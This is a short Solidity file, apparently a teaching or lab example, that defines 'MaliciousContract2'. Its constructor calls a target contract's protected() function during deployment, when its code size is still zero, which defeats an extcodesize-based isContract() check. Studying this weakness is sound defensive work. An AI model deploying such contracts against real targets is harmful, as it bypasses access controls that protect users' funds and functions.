// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./VulnerableContract.sol";

contract MaliciousContract2 {
    bool public isContract;
    address public addr;

    // When contract is being created, code size (extcodesize) is 0.
    // This will bypass the isContract() check
    constructor(address _target) {
        isContract = VulnerableContract(_target).isContract(address(this));
        addr = address(this);
        // This will work
        VulnerableContract(_target).protected();
    }
}
